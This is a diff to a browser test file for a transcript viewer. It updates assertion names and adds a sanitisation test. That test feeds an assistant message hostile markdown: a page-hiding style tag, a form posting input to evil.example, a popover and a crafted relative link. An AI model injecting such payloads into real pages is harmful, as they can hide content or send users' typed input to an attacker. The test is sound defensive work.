@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest'
-import { page, userEvent } from '@vitest/browser/context'
+import { page, userEvent } from 'vitest/browser'
 import type { TranscriptMessage, TranscriptPage } from '@shared/types'
 import { renderApp } from './renderApp'
 import { message, type FakeSession } from './fakeApiary'
@@ -11,7 +11,7 @@ describe('transcript', () => {
     await userEvent.click(sidebarSession('Fix CSV export bug'))
     await expect.element(page.getByTestId('transcript')).toBeVisible()
     await until(() => page.getByTestId('message').elements().length > 0)
-    await expect.element(page.getByTestId('message').elements()[0]).toHaveTextContent('the export is empty')
+    await expect.element(page.getByTestId('message').elements()[0]).toMatchTextContent('the export is empty')
   })
 
   it('marks user and assistant messages distinctly', async () => {
@@ -27,10 +27,10 @@ describe('transcript', () => {
     await renderApp()
     await userEvent.click(sidebarSession('Fix CSV export bug'))
     await until(() => page.getByTestId('message').elements().length > 0)
-    await expect.element(page.getByTestId('message').elements()[0]).toHaveTextContent('the export is empty')
+    await expect.element(page.getByTestId('message').elements()[0]).toMatchTextContent('the export is empty')
 
     await userEvent.click(sidebarSession('Add worktree switcher'))
-    await expect.element(page.getByTestId('session-title')).toHaveTextContent('Add worktree switcher')
+    await expect.element(page.getByTestId('session-title')).toMatchTextContent('Add worktree switcher')
     await expect.element(page.getByTestId('transcript')).toBeVisible()
   })
 
@@ -50,6 +50,36 @@ describe('transcript', () => {
     await expect.element(page.getByText('subagent side note')).not.toBeInTheDocument()
     await userEvent.click(toggle)
     await expect.element(page.getByText('subagent side note')).toBeVisible()
+  })
+
+  it('sanitises hostile markdown: no form, style, popover or same-page link, but a real link and text survive', async () => {
+    // SEC-2: a transcript is untrusted content. This message tries a `<style>` restyle, a form
+    // that could post typed input elsewhere, a top-layer popover, and a relative link that would
+    // resolve to the app's own page with an attacker-chosen `?restore=` query.
+    const hostile = [
+      '<style>body{display:none}</style>',
+      '<form action="https://evil.example/collect"><input name="q"><button>go</button></form>',
+      '<div popover>surprise</div>',
+      '[reload](?restore=%7B%7D)',
+      '[docs](https://example.com/docs)',
+    ].join('\n\n')
+    const hostileSession: FakeSession = {
+      sessionId: '66666666-6666-6666-6666-666666666666',
+      title: 'Hostile transcript',
+      projectPath: '/fixture/work-a',
+      gitBranch: 'main',
+      messages: [message('h1', 'assistant', hostile)],
+    }
+    await renderApp({ sessions: [hostileSession] })
+    await userEvent.click(sidebarSession('Hostile transcript'))
+    await until(() => page.getByTestId('message').elements().length > 0)
+    const html = page.getByTestId('message').elements()[0].innerHTML
+    expect(html).not.toContain('<style')
+    expect(html).not.toContain('<form')
+    expect(html).not.toContain('<button')
+    expect(html).not.toContain('popover')
+    expect(html).not.toMatch(/href="\?/)
+    await expect.element(page.getByRole('link', { name: 'docs' })).toHaveAttribute('href', 'https://example.com/docs')
   })
 
   describe('paging a long session', () => {
@@ -171,9 +201,9 @@ describe('transcript', () => {
         .find((m) => m.textContent?.includes('A heading') === true)
       if (found === undefined) throw new Error('no message with the heading')
 
-      await expect.element(found.querySelector('h2')!).toHaveTextContent('A heading')
-      await expect.element(found.querySelector('p > code')!).toHaveTextContent('inline code')
-      await expect.element(found.querySelector('pre code')!).toHaveTextContent('console.log(1)')
+      await expect.element(found.querySelector('h2')!).toMatchTextContent('A heading')
+      await expect.element(found.querySelector<HTMLElement>('p > code')!).toMatchTextContent('inline code')
+      await expect.element(found.querySelector<HTMLElement>('pre code')!).toMatchTextContent('console.log(1)')
       // The raw markdown syntax itself must not leak into the rendered text.
       expect(found.textContent).not.toContain('##')
       expect(found.textContent).not.toContain('```')
